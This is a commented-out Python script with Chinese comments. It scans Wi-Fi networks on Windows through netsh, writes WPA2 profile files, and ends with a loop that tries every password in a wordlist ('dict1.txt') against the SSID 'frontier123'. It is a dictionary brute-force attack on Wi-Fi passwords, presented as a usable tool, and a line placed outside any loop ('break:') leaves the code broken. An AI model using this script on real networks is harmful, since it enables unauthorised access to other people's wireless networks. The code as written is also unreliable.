# import subprocess
# import re
# def scan_wifi():
#     try:
#         # 调用 Windows 的 netsh 命令
#         result = subprocess.check_output(["netsh", "wlan", "show", "networks", "mode=bssid"], encoding='utf-8')
#         # 使用正则表达式提取 SSID 和信号强度
#         ssids = re.findall(r'SSID \d+ : (.+)', result)
#         signals = re.findall(r'Signal\s+: (\d+)%', result)
#         # 打印结果
#         print("可用的 Wi-Fi 网络：")
#         for i, (ssid, signal) in enumerate(zip(ssids, signals), 1):
#             print(f"{i}. SSID: {ssid}, 信号强度: {signal}%")
#     except subprocess.CalledProcessError as e:
#         print("扫描 Wi-Fi 时发生错误：", e)
# scan_wifi()
#
#
# import subprocess
# import os
# import time
#
# # 连接 Wi-Fi 的函数
# def connect_wifi(ssid, password):
#     profile_name = ssid
#     xml_filename = f"{ssid}.xml"
#
#     # 生成 Wi-Fi 配置文件（XML 格式）
#     wifi_profile = f"""
#     <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
#         <name>{profile_name}</name>
#         <SSIDConfig>
#             <SSID>
#                 <name>{ssid}</name>
#             </SSID>
#         </SSIDConfig>
#         <connectionType>ESS</connectionType>
#         <connectionMode>manual</connectionMode>
#         <MSM>
#             <security>
#                 <authEncryption>
#                     <authentication>WPA2PSK</authentication>
#                     <encryption>AES</encryption>
#                     <useOneX>false</useOneX>
#                 </authEncryption>
#                 <sharedKey>
#                     <keyType>passPhrase</keyType>
#                     <protected>false</protected>
#                     <keyMaterial>{password}</keyMaterial>
#                 </sharedKey>
#             </security>
#         </MSM>
#     </WLANProfile>
#     """
#
#     # 写入临时 XML 文件
#     with open(xml_filename, 'w') as f:
#         f.write(wifi_profile)
#
#     try:
#         # 添加配置文件
#         subprocess.run(["netsh", "wlan", "add", "profile", f"filename={xml_filename}"], check=True)
#
#         # 尝试连接
#         subprocess.run(["netsh", "wlan", "connect", f"name={profile_name}"], check=True)
#         print(f"已尝试连接到 {ssid}，快速检查状态...")
#
#         # 等待更长时间再检查连接
#         time.sleep(2)  # 等待 2 秒
#
#         # 直接检查当前网络接口的连接状态
#         result = subprocess.check_output(["netsh", "wlan", "show", "interfaces"], encoding='utf-8')
#
#         # 如果 SSID 出现并且连接状态是 "connected"，则认为连接成功
#         if ssid in result and "State" in result and "connected" in result.lower():
#             print(f"✅ 成功连接到 Wi-Fi：{ssid}")
#             return True
#         else:
#             print(f"❌ 无法连接到 {ssid}，密码错误或网络不可用。")
#             return False
#
#     except subprocess.CalledProcessError as e:
#         print("连接过程中发生错误：", e)
#         return False
#
#     finally:
#         # 删除临时文件
#         if os.path.exists(xml_filename):
#             os.remove(xml_filename)
#
# # 验证密码的函数
# def is_password_correct(ssid, password):
#     print(f"正在尝试连接 Wi-Fi {ssid}...")
#
#     # 调用连接 Wi-Fi 的函数并判断是否连接成功
#     return connect_wifi(ssid, password)
#
#
#
#
# # ===== 用法：验证某个密码是否正确 =====
# def try_connect(ssid, password):
#     if is_password_correct(ssid, password):
#         print("✅ 密码合法，连接成功。")
#         break:
#     else:
#         print("❌ 密码错误，连接失败。")
# # ssid='NETGEAR99'
# # password='pass'
# # ssid='frontier123'
# # password='123123abcd'
# # try_connect(ssid, password)
#
# filename = ("dict1.txt")
# with open(filename, 'r') as file:
#     ssid = 'frontier123'
#     # 使用迭代器逐行读取
#     for line in file:
#         password=line.strip()
#         try_connect(ssid, password)
